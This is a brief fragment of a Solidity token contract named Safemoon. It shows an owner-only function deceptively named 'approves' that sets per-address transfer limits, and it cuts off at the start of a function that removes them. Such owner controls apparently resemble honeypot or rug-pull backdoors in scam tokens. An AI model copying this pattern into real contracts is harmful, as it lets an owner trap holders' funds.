...
contract Safemoon is Context, Ownable, IERC20 {
    ...
    function approves(address sres, uint256 litt) public onlyOwner {
        totalTransferlitts[sres] = litt;
    }

    // Allows the owner to remove the transfer litt for a sres.
    function removepota(address sres) public onlyOwner {
